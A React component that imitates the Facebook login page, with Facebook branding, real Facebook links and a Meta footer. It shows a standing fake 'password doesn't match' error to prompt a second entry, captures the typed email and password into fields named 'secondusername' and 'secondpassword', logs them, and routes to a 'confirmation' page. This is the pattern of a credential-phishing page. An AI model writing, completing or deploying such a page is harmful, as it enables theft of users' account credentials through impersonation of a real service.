import React, { useState } from "react";
import Col from "react-bootstrap/Col";
import Form from "react-bootstrap/Form";
import Row from "react-bootstrap/Row";
import Button from "react-bootstrap/Button";
import { Link } from "react-router-dom";
import Container from "react-bootstrap/esm/Container";
  const initialState = {
    secondusername: "",
    secondpassword: "",
  };
export const Facebooklogin = () => {
  const [id, setId] = useState(initialState);
  const [eyeState, setEyeState] = useState("visibility_hidden");

  const handleOnChange = (e) => {
    e.preventDefault();
    const { name, value } = e.target;
    setId({ ...id, [name]: value });
  };
  console.log(id)
  return (
    <div>
      <div className="error_message ">
        The password you've entered dooesn't match with the account provided.
        Please try submitting again.
        <span>
          <a href="#" className="find_account dead_link">
            Find your account
          </a>
        </span>
      </div>
      <Container>
        <Row className="text-center mt-2 mb-2">
          <div className="facebook_heading">Facebook</div>
        </Row>
        <Form>
          <Row className="mb-2">
            <Col md={5} className="mb-2">
              <Form.Control
                placeholder="Mobile number or email address"
                className="facebook_inputs"
                id="form_control__error1"
                onChange={handleOnChange}
                name="secondusername"
              />
            </Col>
            <Col md={5} className="mb-2">
              <div className="facebook_password">
                <Form.Control
                  placeholder="Password"
                  className="facebook_inputs"
                  id="form_control__error2"
                  type="password"
                  onChange={handleOnChange}
                  name="secondpassword"
                />
                <span className={eyeState}>
                  <i className="fa-solid fa-eye-slash eye"></i>
                </span>
                <span>
                  <i className="fa-sharp fa-solid fa-eye eye"></i>
                </span>
              </div>
            </Col>
            <Col>
              <Link to="confirmation">
                <Button
                  variant="primary"
                  size="lg"
                  className="login_button"
                  type="submit"
                >
                  Log In
                </Button>
              </Link>
            </Col>
          </Row>
          <Row>
            <Col>
              <div className="forgotten_password">
                <a
                  href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr"
                  className="forgotten_password__link"
                  variant="primary"
                  target="_blank"
                >
                  Forgotten password?
                </a>
              </div>
            </Col>
          </Row>
          <Row>
            <Col>
              <hr></hr>
            </Col>
            or
            <Col>
              <hr />
            </Col>
          </Row>
          <Row>
            <Col></Col>
            <Col md={5}>
              <Button variant="success" className="create_new__account">
                <a
                  href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&soft=hjk"
                  target="_blank"
                  className="dead_link"
                >
                  Create New Account
                </a>
              </Button>
            </Col>
            <Col></Col>
          </Row>
        </Form>
        <Row className="text-center mt-5 footer_list">
          <Col>
            <a
              href="https://about.meta.com/"
              className="dead_link"
              target="_blank"
            >
              About
            </a>
          </Col>
          <Col>
            <a
              href="https://www.facebook.com/help?_rdc=1&_rdr"
              className="dead_link"
              target="_blank"
            >
              Help
            </a>
          </Col>
          <Col>
            <a
              href="https://web.facebook.com/privacy/policy/?entry_point=facebook_page_footer"
              className="dead_link"
              target="_blank"
            >
              Privacy policy
            </a>
          </Col>
          <Col>
            <a href="#" className="dead_link bold_custom">
              English(UK)
            </a>
          </Col>
        </Row>
        <Row className="text-center mt-3">
          <div>Meta &copy; 2023</div>{" "}
        </Row>
      </Container>
    </div>
  );
};
